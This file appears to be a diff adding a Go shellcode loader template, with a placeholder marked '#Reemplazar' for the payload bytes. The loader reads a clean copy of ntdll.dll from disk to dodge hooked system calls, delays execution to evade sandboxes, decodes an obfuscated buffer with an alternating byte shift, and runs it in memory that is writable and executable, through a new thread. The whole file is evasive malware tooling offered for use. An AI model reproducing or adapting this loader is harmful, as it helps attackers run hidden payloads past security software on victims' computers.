@@ -1,0 +1,116 @@
+package main
+
+import (
+	"os"
+	"unsafe"
+
+	"github.com/Binject/universal"
+)
+
+const (
+	PAGE_EXECUTE_READWRITE = 0x00000040
+	PROCESS                = 0xffffffffffffffff
+	MEM_COMMIT             = 0x001000
+	MEM_RESERVE            = 0x002000
+	INFINITE               = 0xFFFFFFFF
+	PAGE_EXECUTE           = 0x10
+)
+
+var shellcode = []byte{#Reemplazar}
+
+
+func main() {
+	bytesDll, err := os.ReadFile("C:\\Windows\\System32\\ntdll.dll")
+	if err != nil {
+		panic(err)
+	}
+
+	loader, err := universal.NewLoader()
+	if err != nil {
+		panic(err)
+	}
+
+	ntdll, err := loader.LoadLibrary("main", &bytesDll)
+	if err != nil {
+		panic(err)
+	}
+
+	time := -(5000 * 10000)
+	_, err = ntdll.Call("NtDelayExecution",
+		0,
+		uintptr(unsafe.Pointer(&time)),
+		0,
+	)
+	if err != nil {
+		panic(err)
+	}
+
+	shellcode = dec(shellcode)
+	var base uintptr
+	regionsize := len(shellcode)
+	_, err = ntdll.Call("NtAllocateVirtualMemory",
+		PROCESS,
+		uintptr(unsafe.Pointer(&base)),
+		0,
+		uintptr(unsafe.Pointer(&regionsize)),
+		MEM_COMMIT|MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE,
+	)
+	if err != nil {
+		panic(err)
+	}
+
+	_, err = ntdll.Call("NtWriteVirtualMemory",
+		PROCESS,
+		uintptr(base),
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		0,
+	)
+	if err != nil {
+		panic(err)
+	}
+
+	var hThread uintptr
+
+	_, err = ntdll.Call("NtCreateThreadEx",
+		uintptr(unsafe.Pointer(&hThread)),
+		0x1FFFFF,
+		uintptr(0),
+		PROCESS,
+		base,
+		uintptr(0),
+		uintptr(0),
+		uintptr(0),
+		uintptr(0),
+		uintptr(0),
+		uintptr(0),
+	)
+	if err != nil {
+		panic(err)
+	}
+
+	time2 := -(INFINITE)
+	_, err = ntdll.Call("NtWaitForSingleObject",
+		hThread,
+		0,
+		uintptr(unsafe.Pointer(&time2)),
+	)
+	if err != nil {
+		panic(err)
+	}
+}
+
+func dec(b []byte) []byte {
+	n := 0
+	for i := 0; i < len(b); i++ {
+		if n == 0 {
+			b[i] -= 10
+			n = 1
+		} else {
+			b[i] += 11
+            n = 0
+		}
+	}
+	return b
+}
